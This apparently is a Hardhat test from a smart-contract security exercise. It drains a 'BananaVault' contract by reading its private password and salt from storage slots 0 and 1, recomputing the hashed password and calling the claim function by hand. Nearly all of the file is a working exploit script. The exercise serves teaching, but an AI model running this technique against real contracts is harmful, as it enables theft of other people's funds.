import { ethers, upgrades } from 'hardhat'
import { expect } from 'chai'
import { formatEther, parseEther, concat } from 'ethers'

describe('Exercise 2', () => {
  it('should drain BananaVault', async () => {
    const [exploiter] = await ethers.getSigners()
    const contractAddress = '0x5f1b1316D1cB4f497c0409Ae86153DE215A238C7'
    //  const contract = await ethers.getContractAt('BananaVault', contractAddress)

    const contractBalanceBeforeAttack = await ethers.provider.getBalance(
      contractAddress
    )
    console.log(
      `Contract ${contractAddress} balance before attack: ${formatEther(
        contractBalanceBeforeAttack
      )}`
    )

    // `hiddenPassword_HWFGG` is private and cannot be accessed directly through the contract,
    // but it can be retrieved from the contract's storage.
    // Since it is of type uint256, it is fully stored in the first slot (position = 0) of the contract's storage.
    const hiddenPasswordData = BigInt(
      await ethers.provider.getStorage(contractAddress, 0)
    )

    // Since `salt_HNGMID` is of type uint256,
    // it is fully stored in the second slot (position = 1) of the contract's storage.
    const saltData = BigInt(
      await ethers.provider.getStorage(contractAddress, 1)
    )

    //  uint256(keccak256(abi.encode(hiddenPassword_HWFGG + salt_HNGMID)))
    const password = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ['uint256'],
        [hiddenPasswordData + saltData]
      )
    )

    const functionSignature = 'claimBanana_QTBNFS(uint256)'
    const functionSelector = ethers
      .keccak256(ethers.toUtf8Bytes(functionSignature))
      .slice(0, 10) // First 4 bytes of the hash ("0x" + 8 characters)
    const argumentData = password.slice(2) // Remove the 0x prefix

    // 0x2e69c18c + c25b6056c19405007c3150c26342dafe26797e4b5f3bbe814871c3a16c9ffd62
    const data = functionSelector + argumentData // Combine the selector and encoded arguments

    await expect(
      exploiter.sendTransaction({
        to: contractAddress,
        data,
        value: parseEther('0')
      })
    ).to.changeEtherBalances(
      [exploiter.address, contractAddress],
      [contractBalanceBeforeAttack, -contractBalanceBeforeAttack]
    )

    const contractBalanceAfterAttack = await ethers.provider.getBalance(
      contractAddress
    )

    console.log(
      `Contract ${contractAddress} balance after attack: ${formatEther(
        contractBalanceAfterAttack
      )}`
    )
  })
})
